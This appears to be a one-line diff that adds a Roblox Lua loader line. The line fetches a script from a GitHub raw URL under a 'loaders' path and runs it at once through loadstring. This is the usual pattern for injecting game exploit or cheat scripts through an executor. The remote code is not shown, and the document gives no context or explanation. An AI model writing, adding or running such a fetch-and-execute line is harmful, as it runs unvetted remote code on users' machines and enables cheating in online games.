@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/anomaly-lockdown-tweaked-spam4-ln23k0udhy6hbs.lua"))()
